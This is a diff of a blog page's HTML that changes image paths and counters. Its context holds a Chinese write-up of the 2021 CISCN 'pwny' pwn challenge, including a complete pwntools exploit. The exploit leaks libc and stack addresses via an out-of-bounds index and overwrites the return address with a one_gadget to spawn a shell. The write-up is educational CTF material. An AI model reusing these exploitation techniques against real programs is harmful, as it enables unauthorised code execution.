@@ -15,13 +15,13 @@
 <meta property="og:site_name" content="mkx7&#39;blog">
 <meta property="og:description" content="第一次单独做正式比赛的pwn，比赛时看到题还是挺懵的一道题没做出来，赛后又看了下几道pwn题的wp，写本篇记录下看的那几道pwn题，虽然事后看了wp感觉题的确不算难但是估计明年再自己做还是挺困难。">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/cach/image-20210525154839420.png">
+<meta property="og:image" content="http://example.com/2021/cach/image-20210525154839420.png">
 <meta property="article:published_time" content="2021-06-05T12:31:16.000Z">
 <meta property="article:modified_time" content="2021-06-05T12:35:09.501Z">
 <meta property="article:author" content="mkx7">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/cach/image-20210525154839420.png">
+<meta name="twitter:image" content="http://example.com/2021/cach/image-20210525154839420.png">
   
     <link rel="alternative" href="/atom.xml" title="mkx7&#39;blog" type="application/atom+xml">
   
@@ -81,10 +81,10 @@
         	    
 
 		<nav>
-    			总文章数 12
+    			总文章数 13
 		</nav>
 		<nav>
-			总字数 <span class="post-count">34.0k</span>
+			总字数 <span class="post-count">34.1k</span>
 		</nav>
 		<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
 		<script>
@@ -212,7 +212,7 @@
 <span id="more"></span>
 
 <h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>这道题虽然分最少但真的不得不说特别考察基础知识和脑洞，思路上拐过了不容易理解的地方现在看还是挺容易理解的，这道题开始没有任何的漏洞，先是result=open(“/dev/urandom”, 0)读取随机数，并且将result放到了bss段上，后面出题人自己写的write和read函数中使用read()函数时都是read((unsigned __int8)byte_202860, &amp;v2, 8uLL)，这样输入的V2就是不可控的，但write函数是这样的：</p>
-<p><img src="../../../../cach/image-20210525154839420.png" alt="image-20210525154839420"></p>
+<p><img src="/2021/06/05/2021Ciscn-wp/../../../cach/image-20210525154839420.png" alt="image-20210525154839420"></p>
 <p>代码没做注释将就看吧，简单说就是可以自由输入v2做偏移，之后qword_202060[v0]（qword_202060也是bss段上的）可以覆盖result，利用偏移将byte_202860修改为0后write函数就可以输入两次了，第2次输入的v2参数也变得可控，利用这点后面再用read函数泄露bss段上的_IO_2_1_stdin_、_IO_2_1_stdout_、_IO_2_1_stderr随便选一个的地址获得libc地址和stack地址，之后再利用libc上的environ泄露stack地址，最后再通过write函数将onegadget直接写入栈上的返回地址即可getshell。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ld_path=&quot;/home/x7/pwn/CISCN/pwny/ld-2.27.so&quot;</span><br><span class="line">libc_path=&quot;/home/x7/pwn/CISCN/pwny/libc-2.27.so&quot;</span><br><span class="line">p=process([ld_path,&quot;./pwny&quot;],env=&#123;&quot;LD_PROLOAD&quot;:libc_path&#125;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">#byte_202860-&gt;0</span><br><span class="line">p.sendline(str(2))</span><br><span class="line">p.sendline(str(256))</span><br><span class="line">p.sendline(str(2))</span><br><span class="line">p.sendline(str(256))</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.send(p64(0xfffffffffffffffa))</span><br><span class="line">p.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">stdin_addr=p.recv(12)</span><br><span class="line">stdin_addr=int(stdin_addr, 16)</span><br><span class="line">log.success(&#x27;stdin_addr: &#x27;+hex(stdin_addr))</span><br><span class="line">libc_base=stdin_addr-libc.sym[&#x27;_IO_2_1_stdin_&#x27;]</span><br><span class="line">log.success(&#x27;libc base: &#x27;+hex(libc_base))</span><br><span class="line"></span><br><span class="line">#leak stack</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(p64(0xfffffffffffffff5))</span><br><span class="line">p.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">stack_base=p.recv(12)</span><br><span class="line">stack_base=int(stack_base,16)-0x202008</span><br><span class="line">log.success(&#x27;stack_base: &#x27;+hex(stack_base))</span><br><span class="line">offset=libc_base-stack_base</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.send(p64((offset+libc.sym[&#x27;__environ&#x27;]-0x202060)/8))</span><br><span class="line">p.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">stack_addr=int(&#x27;0x&#x27;+p.recv(12), 16)</span><br><span class="line">ret_addr=stack_addr+0x120</span><br><span class="line">main_ret=(ret_addr-stack_base+0x202060-0x404300)/8</span><br><span class="line"></span><br><span class="line">#ret-&gt;onegadget </span><br><span class="line">p.sendline(&#x27;2&#x27;)</span><br><span class="line">p.sendline(str(main_ret))</span><br><span class="line">onegadget=libc_base+0x10a41c</span><br><span class="line">p.send(p64(onegadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
